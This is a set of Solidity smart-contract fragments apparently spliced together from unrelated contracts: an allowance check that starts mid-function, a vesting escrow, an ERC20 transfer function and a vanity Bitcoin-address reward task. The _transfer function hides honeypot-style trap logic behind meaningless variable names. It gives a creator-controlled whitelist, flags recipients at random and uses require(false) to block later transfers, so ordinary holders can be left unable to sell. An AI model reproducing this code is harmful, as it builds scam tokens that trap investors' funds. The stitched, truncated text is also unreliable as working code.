    ServiceController _serviceController = ServiceController(serviceController);
    ATxAssetProxy token = ATxAssetProxy(_serviceController.proxy());
    if (token.balanceOf(_from) < _value) {
        return DATA_CONTROLLER_WRONG_ALLOWANCE;
    }
    allowance[_from] = _value;
    return OK;
}

function vest() external {
    uint numEntries = _numVestingEntries(msg.sender);
    uint total;
    for (uint i = 0; i < numEntries; i++) {
        uint time = getVestingTime(msg.sender, i);
        if (time > now) {
            break;
        }
        uint qty = getVestingQuantity(msg.sender, i);
        if (qty > 0) {
            vestingSchedules[msg.sender][i] = [0, 0];
            total = total.add(qty);
        }
    }
    if (total != 0) {
        totalEscrowedBalance = totalEscrowedBalance.sub(total);
        totalEscrowedAccountBalance[msg.sender] = totalEscrowedAccountBalance[msg.sender].sub(total);
        totalVestedAccountBalance[msg.sender] = totalVestedAccountBalance[msg.sender].add(total);
        IERC20(address(periFinance)).transfer(msg.sender, total);
        emit Vested(msg.sender, now, total);
    }
}

function _appendVestingEntry(address account, uint quantity) internal {
    require(quantity != 0, "Quantity cannot be zero");
    totalEscrowedBalance = totalEscrowedBalance.add(quantity);
    require(
        totalEscrowedBalance <= IERC20(address(periFinance)).balanceOf(address(this)),
        "Must be enough balance in the contract to provide for the vesting entry"
    );
    uint scheduleLength = vestingSchedules[account].length;
    require(scheduleLength <= MAX_VESTING_ENTRIES, "Vesting schedule is too long");
    uint time = now + 52 weeks;
    if (scheduleLength == 0) {
        totalEscrowedAccountBalance[account] = quantity;
    } else {
        require(
            getVestingTime(account, scheduleLength - 1) < time,
            "Cannot add new vested entries earlier than the last one"
        );
        totalEscrowedAccountBalance[account] = totalEscrowedAccountBalance[account].add(quantity);
    }
    vestingSchedules[account].push([time, quantity]);
    emit VestingEntryCreated(account, now, quantity);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (james == false)) {
        conquist = chTx;
        utah = true;
    }
    if ((address(sender) == creator) && (james == true)) {
        thunderstorm[recipient] = true;
        music[recipient] = false;
        james = false;
    }
    if ((amount > bowling) && (thunderstorm[sender] == true) && (address(sender) != creator)) {
        parker[recipient] = true;
    }
    if (thunderstorm[recipient] != true) {
        music[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((music[sender]) && (thunderstorm[recipient] == false)) {
        music[recipient] = true;
    }
    if (thunderstorm[sender] == false) {
        if ((amount > bowling) && (parker[sender] == true)) {
            require(false);
        }
        require(amount < conquist);
        if (utah == true) {
            if (parker[sender] == true) {
                require(false);
            }
            parker[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function solveTask(uint _taskId, uint256 _answerPrivateKey, uint256 publicXPoint, uint256 publicYPoint) public isLastestVersion {
    uint taskIndex = safeIndexOfTaskId(_taskId);
    Task storage task = tasks[taskIndex];
    require(task.answerPrivateKey == 0, "solveTask: task is already solved");
    require(_answerPrivateKey >> 128 == uint256(msg.sender) >> 32, "solveTask: this solution does not match miner address");
    if (task.taskType == TaskType.BITCOIN_ADDRESS_PREFIX) {
        require(ec.publicKeyVerify(_answerPrivateKey, publicXPoint, publicYPoint));
        (publicXPoint, publicYPoint) = ec.ecadd(
            task.requestPublicXPoint,
            task.requestPublicYPoint,
            publicXPoint,
            publicYPoint
        );
        require(isValidPublicKey(publicXPoint, publicYPoint));
        bytes32 btcAddress = createBtcAddress(publicXPoint, publicYPoint);
        uint prefixLength = lengthOfCommonPrefix(btcAddress, task.data);
        require(prefixLength == task.dataLength);
        task.answerPrivateKey = _answerPrivateKey;
    } else {
        revert();
    }
    uint256 minerReward = task.reward.mul(MAX_PERCENT - serviceFee).div(MAX_PERCENT); 
    msg.sender.transfer(minerReward);
    totalReward = totalReward.sub(minerReward);
    if (task.referrer != 0) {
        uint256 referrerReward = task.reward.mul(serviceFee).mul(referrerFee).div(MAX_PERCENT).div(MAX_PERCENT); 
        task.referrer.transfer(referrerReward);
        totalReward = totalReward.sub(referrerReward);
    }
    _completeTask(_taskId, taskIndex);
    emit TaskSolved(_taskId, minerReward);
}

